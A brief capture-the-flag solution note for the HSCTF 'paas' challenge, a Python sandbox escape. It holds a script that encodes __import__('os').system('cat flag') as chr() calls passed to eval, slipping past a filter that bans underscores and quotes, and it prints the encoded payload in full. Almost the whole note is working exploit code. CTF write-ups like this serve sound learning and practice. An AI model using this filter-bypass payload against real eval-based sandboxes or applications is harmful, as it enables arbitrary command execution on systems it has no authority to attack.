---
created: 2024-06-11T01:36
updated: 2024-06-11T01:38
---

## HSCTF - miscellaneous/paas

Python sandbox escape with ban on most characters like `_` and quotes

```python
str = '__import__("os").system("cat flag")'

print('eval('+'+'.join(['chr(%d)' % ord(c) for c in str])+')')
```

```python
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(41))
```
